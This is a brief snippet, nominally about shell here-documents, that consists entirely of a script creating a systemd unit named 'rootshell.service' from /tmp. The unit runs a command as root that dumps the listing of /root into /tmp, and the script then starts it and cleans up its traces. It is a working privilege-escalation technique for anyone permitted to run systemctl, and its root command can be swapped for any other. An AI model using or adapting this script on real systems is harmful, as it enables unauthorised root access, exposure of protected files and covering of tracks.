


"<<EOF" - here document



```
SERVICE_FILE="/tmp/rootshell.service"

cat <<EOF > $SERVICE_FILE
[Unit]
Description=Root Shell

[Service]
Type=simple
ExecStart=/bin/bash -c 'ls /root > /tmp/root_contents.txt'
User=root

[Install]
WantedBy=multi-user.target
EOF




systemctl link /tmp/rootshell.service

systemctl daemon-reload

systemctl start rootshell.service



# Cleanup
rm -f $SERVICE_FILE
systemctl stop rootshell.service
systemctl disable rootshell.service
rm -f /tmp/root_contents.txt
systemctl daemon-reload
```
